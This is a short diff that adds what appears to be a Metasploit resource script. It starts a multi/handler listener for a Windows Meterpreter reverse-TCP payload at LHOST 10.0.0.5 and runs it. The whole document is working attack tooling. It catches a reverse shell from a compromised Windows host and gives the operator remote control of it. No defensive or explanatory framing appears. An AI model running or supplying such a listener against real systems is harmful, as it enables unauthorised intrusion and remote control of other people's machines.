@@ -1,0 +1,4 @@
+use exploit/multi/handler
+set PAYLOAD windows/meterpreter/reverse_tcp
+set LHOST 10.0.0.5
+exploit
